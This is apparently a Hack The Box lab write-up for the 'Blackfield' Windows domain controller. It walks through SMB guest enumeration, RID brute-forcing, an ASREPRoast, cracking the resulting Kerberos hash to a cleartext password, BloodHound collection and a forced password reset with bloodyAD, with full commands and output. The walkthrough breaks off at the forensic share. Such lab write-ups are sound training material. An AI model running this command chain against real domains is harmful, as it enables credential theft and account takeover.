<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Blackfield (Windows Hard) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous &#x2F; Guest access to an SMB share is used to enumerate users. Once user is found to">
<meta property="og:type" content="article">
<meta property="og:title" content="Blackfield (Windows Hard)">
<meta property="og:url" content="https://d34db33fb04h.github.io/2025/02/24/blackfield/index.html">
<meta property="og:site_name" content="SidePieceVillage">
<meta property="og:description" content="Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous &#x2F; Guest access to an SMB share is used to enumerate users. Once user is found to">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://d34db33fb04h.github.io/img/blackfield.png">
<meta property="article:published_time" content="2025-02-24T18:28:33.000Z">
<meta property="article:modified_time" content="2025-03-29T18:44:43.370Z">
<meta property="article:author" content="Jay">
<meta property="article:tag" content="SMB">
<meta property="article:tag" content="ASREPRoasting">
<meta property="article:tag" content="Hashcat">
<meta property="article:tag" content="pypykatz">
<meta property="article:tag" content="BackupOperators">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://d34db33fb04h.github.io/img/blackfield.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Blackfield (Windows Hard)",
  "url": "https://d34db33fb04h.github.io/2025/02/24/blackfield/",
  "image": "https://d34db33fb04h.github.io/img/blackfield.png",
  "datePublished": "2025-02-24T18:28:33.000Z",
  "dateModified": "2025-03-29T18:44:43.370Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2025/02/24/blackfield/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Blackfield (Windows Hard)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://app.hackthebox.com/profile/420575"><i class="fa-fw fas fa-rss"></i><span> HTB</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Blackfield (Windows Hard)</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://app.hackthebox.com/profile/420575"><i class="fa-fw fas fa-rss"></i><span> HTB</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Blackfield (Windows Hard)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-02-24T18:28:33.000Z" title="Created 2025-02-24 12:28:33">2025-02-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-03-29T18:44:43.370Z" title="Updated 2025-03-29 13:44:43">2025-03-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/htb/">htb</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous &#x2F; Guest access to an SMB share is used to enumerate users. Once user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator. </p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-28 22:58:26Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>Looking into shares:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nxc smb blackfield.local -u Guest -p &#x27;&#x27; --shares</span><br><span class="line">SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\Guest:</span><br><span class="line">SMB         10.10.10.192    445    DC01             [*] Enumerated shares</span><br><span class="line">SMB         10.10.10.192    445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         10.10.10.192    445    DC01             -----           -----------     ------</span><br><span class="line">SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.10.192    445    DC01             C$                              Default share</span><br><span class="line">SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.</span><br><span class="line">SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share</span><br><span class="line">SMB         10.10.10.192    445    DC01             profiles$       READ</span><br><span class="line">SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share</span><br></pre></td></tr></table></figure>

<p>Since <code>Guest</code> was enabled, I tried getting users by rid bruteforcing. This gave us ALOT of users.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb blackfield.local -u Guest -p &#x27;&#x27; --rid-brute</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">SMB         10.10.10.192    445    DC01             1000: BLACKFIELD\DC01$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1101: BLACKFIELD\DnsAdmins (SidTypeAlias)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1102: BLACKFIELD\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1103: BLACKFIELD\audit2020 (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1104: BLACKFIELD\support (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1105: BLACKFIELD\BLACKFIELD764430 (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1106: BLACKFIELD\BLACKFIELD538365 (SidTypeUser)</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">SMB         10.10.10.192    445    DC01             1411: BLACKFIELD\BLACKFIELD653097 (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1412: BLACKFIELD\BLACKFIELD438814 (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1413: BLACKFIELD\svc_backup (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1414: BLACKFIELD\lydericlefebvre (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1415: BLACKFIELD\PC01$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1416: BLACKFIELD\PC02$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1417: BLACKFIELD\PC03$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1418: BLACKFIELD\PC04$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1419: BLACKFIELD\PC05$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1420: BLACKFIELD\PC06$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1421: BLACKFIELD\PC07$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1422: BLACKFIELD\PC08$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1423: BLACKFIELD\PC09$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1424: BLACKFIELD\PC10$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1425: BLACKFIELD\PC11$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1426: BLACKFIELD\PC12$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1427: BLACKFIELD\PC13$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1428: BLACKFIELD\SRV-WEB$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1429: BLACKFIELD\SRV-FILE$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1430: BLACKFIELD\SRV-EXCHANGE$ (SidTypeUser)</span><br><span class="line">SMB         10.10.10.192    445    DC01             1431: BLACKFIELD\SRV-INTRANET$ (SidTypeUser)</span><br></pre></td></tr></table></figure>

<h2 id="KERBEROS"><a href="#KERBEROS" class="headerlink" title="KERBEROS"></a>KERBEROS</h2><p>From there I validated users via kerbrute. All of them seemed to be valid so thats a drag.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$ kerbrute userenum --dc 10.10.10.192 -d blackfield.local users.list</span><br><span class="line"></span><br><span class="line">    __             __               __</span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____</span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/</span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 02/28/25 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2025/02/28 11:30:45 &gt;  Using KDC(s):</span><br><span class="line">2025/02/28 11:30:45 &gt;  	10.10.10.192:88</span><br><span class="line"></span><br><span class="line">2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 Administrator@blackfield.local</span><br><span class="line">2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 audit2020@blackfield.local</span><br><span class="line">2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 BLACKFIELD189208@blackfield.local</span><br><span class="line">2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 DC01$@blackfield.local</span><br><span class="line">2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 Guest@blackfield.local</span><br><span class="line">2025/02/28 11:30:50 &gt;  [+] VALID USERNAME:	 support@blackfield.local</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">2025/02/28 11:33:27 &gt;  [+] VALID USERNAME:	 svc_backup@blackfield.local</span><br><span class="line">2025/02/28 11:33:27 &gt;  [+] VALID USERNAME:	 BLACKFIELD438814@blackfield.local</span><br><span class="line">2025/02/28 11:33:27 &gt;  [+] VALID USERNAME:	 BLACKFIELD653097@blackfield.local</span><br><span class="line">2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC10$@blackfield.local</span><br><span class="line">2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC07$@blackfield.local</span><br><span class="line">2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 SRV-WEB$@blackfield.local</span><br><span class="line">2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC09$@blackfield.local</span><br><span class="line">2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC13$@blackfield.local</span><br><span class="line">2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC11$@blackfield.local</span><br><span class="line">2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC05$@blackfield.local</span><br><span class="line">2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC06$@blackfield.local</span><br><span class="line">2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC08$@blackfield.local</span><br><span class="line">2025/02/28 11:33:32 &gt;  [+] VALID USERNAME:	 PC12$@blackfield.local</span><br><span class="line">2025/02/28 11:33:38 &gt;  [+] VALID USERNAME:	 SRV-EXCHANGE$@blackfield.local</span><br><span class="line">2025/02/28 11:33:38 &gt;  [+] VALID USERNAME:	 SRV-FILE$@blackfield.local</span><br><span class="line">2025/02/28 11:33:38 &gt;  [+] VALID USERNAME:	 SRV-INTRANET$@blackfield.local</span><br><span class="line">2025/02/28 11:33:38 &gt;  Done! Tested 333 usernames (332 valid) in 172.662 seconds</span><br></pre></td></tr></table></figure>
<p>Never the less, I wanted to see if anyone has PRE-AUTH DISABLED. We got one user <code>support</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ GetNPUsers.py -dc-ip 10.10.10.192 -dc-host blackfield.local -usersfile users.list -no-pass &#x27;blackfield.local/&#x27;</span><br><span class="line"></span><br><span class="line">[-] User Administrator doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User Guest doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class="line">[-] User DC01$ doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User audit2020 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">$krb5asrep$23$support@BLACKFIELD.LOCAL:a0fc2d3cd96d551c43ed7ddfcf9f0efa$9861e8be198b1bbf19120a2f99a8d05d7363d86f881bc81256c8271b7f1985c460fb6e64d15b6d9a67bd9476c3f43f35123f287790932e9006a7181705293cf6e1c442ce05eadece13ccdf7549f7e3f4d61ce09332c6ac8f8ccae98f3488a8e7f3fe91cf005b5a91cfdb78ca6f5dbba2d378ab1016824b5e2c1a9d4aae931fb5ab8889bafad195b4bcd84f553e130a3535efdf2685809a1da5d77e1936eb84fc5e2d6b1d046e845ed381f3f866bc1d47a87d18a393ad55e566e6485f5a52231a34ea9c8feea6ec223314fc227ee3c240d7f03998089456763f2cdb4aace7a32d41f6f9b9b11d2553afdb985948a6f58e2366b804</span><br><span class="line">[-] User BLACKFIELD764430 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User BLACKFIELD538365 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User BLACKFIELD189208 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User BLACKFIELD404458 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User BLACKFIELD706381 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/img/great.gif" alt="GREAT SUCCESS"><br>Cracking this with hashcat gives us a clear text password.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat support.hash /usr/share/wordlists/rockyou.txt --show</span><br><span class="line">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class="line">The following mode was auto-detected as the only one matching your input hash:</span><br><span class="line"></span><br><span class="line">18200 | Kerberos 5, etype 23, AS-REP | Network Protocol</span><br><span class="line"></span><br><span class="line">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class="line">Do NOT report auto-detect issues unless you are certain of the hash type.</span><br><span class="line"></span><br><span class="line">$krb5asrep$23$support@BLACKFIELD.LOCAL:a0fc2d3cd96d551c43ed7ddfcf9f0efa$9861e8be198b1bbf19120a2f99a8d05d7363d86f881bc81256c8271b7f1985c460fb6e64d15b6d9a67bd9476c3f43f35123f287790932e9006a7181705293cf6e1c442ce05eadece13ccdf7549f7e3f4d61ce09332c6ac8f8ccae98f3488a8e7f3fe91cf005b5a91cfdb78ca6f5dbba2d378ab1016824b5e2c1a9d4aae931fb5ab8889bafad195b4bcd84f553e130a3535efdf2685809a1da5d77e1936eb84fc5e2d6b1d046e845ed381f3f866bc1d47a87d18a393ad55e566e6485f5a52231a34ea9c8feea6ec223314fc227ee3c240d7f03998089456763f2cdb4aace7a32d41f6f9b9b11d2553afdb985948a6f58e2366b804:#00^BlackKnight</span><br></pre></td></tr></table></figure>

<h2 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h2><p>Now we have some credentials to get a bloodhound dump.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ nxc ldap 10.10.10.192 -u support -p &#x27;#00^BlackKnight&#x27; --dns-server 10.10.10.192 --bloodhound -c All</span><br><span class="line">SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        10.10.10.192    389    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight</span><br><span class="line">LDAP        10.10.10.192    389    DC01             Resolved collection methods: rdp, acl, container, session, trusts, psremote, dcom, objectprops, localadmin, group</span><br><span class="line">LDAP        10.10.10.192    389    DC01             Done in 00M 08S</span><br><span class="line">LDAP        10.10.10.192    389    DC01             Compressing output into /home/jaybit/.nxc/logs/DC01_10.10.10.192_2025-02-28_114320_bloodhound.zip</span><br></pre></td></tr></table></figure>
<p>Looking at our pwnd user <code>support</code>, we see we have <code>ForceChangePassword</code> over <code>audit2020</code>. So using <code>bloodyAD</code>(MyFaV), we change his password.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./bloodyAD.py -v DEBUG -u &#x27;support&#x27; -p &#x27;#00^BlackKnight&#x27; --host 10.10.10.192 -d blackfield.local set password audit2020 Password123</span><br><span class="line">[*] Trying to connect to 10.10.10.192...</span><br><span class="line">[+] Connection successful</span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure>
<p>Now back to <code>SMB</code> and see what he has access to.</p>
<h2 id="SMB-Round-2"><a href="#SMB-Round-2" class="headerlink" title="SMB Round 2"></a>SMB Round 2</h2><p>Running NetExec shows we have <code>READ</code> to the forencis share.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb blackfield.local -u audit2020 -p Password123 --shares</span><br><span class="line">SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Password123</span><br><span class="line">SMB         10.10.10.192    445    DC01             [*] Enumerated shares</span><br><span class="line">SMB         10.10.10.192    445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         10.10.10.192    445    DC01             -----           -----------     ------</span><br><span class="line">SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.10.192    445    DC01             C$                              Default share</span><br><span class="line">SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.</span><br><span class="line">SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share</span><br><span class="line">SMB         10.10.10.192    445    DC01             profiles$       READ</span><br><span class="line">SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share</span><br></pre></td></tr></table></figure>
<p>Looking into this share with <code>impacket-smbclient</code> showed us a couple to choose from.</p>
